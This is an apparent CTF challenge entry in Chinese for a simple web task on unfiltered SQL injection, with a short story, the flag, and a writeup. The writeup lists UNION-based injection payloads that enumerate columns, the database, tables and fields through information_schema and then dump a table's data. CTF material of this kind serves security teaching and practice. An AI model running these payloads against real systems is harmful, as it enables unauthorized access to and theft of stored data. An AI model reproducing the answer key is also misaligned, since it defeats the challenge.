* 题目名称： saveSaofe1a_partA

* 题目类型： WEB

* 题目难度： 简单

* 出题人： Chimedal

* 考点：无过滤sql注入

* 描述：Saofe1a近期因思念离开的初恋，整天无精打采的。身为Saofe1a好兄弟的你得知后，决定帮他复合。经过一番思考，你决定先帮Saofe1a给小美选一个礼物，正当你对送什么感到一筹莫展的时候，你看到了Saofe1a手机里面的一个网址——高三一班同学录查询系统，或许里面能找到小美的hobbies……

* flag： XSCTF{Saofe1a_r3a11y_l0ve_xiaomei}

* Writeup：
```
该题只会回显一个查询，前面需要是-1

测试字段数
-1' union select 1,2,3,4;#

看数据库
-1' union select 1,2,3,database();#

看表
-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database();#

看字段名
-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='class3';#

看字段名对应的字段值
-1' union select 1,2,3,group_concat(hobbies) from class3;#
```

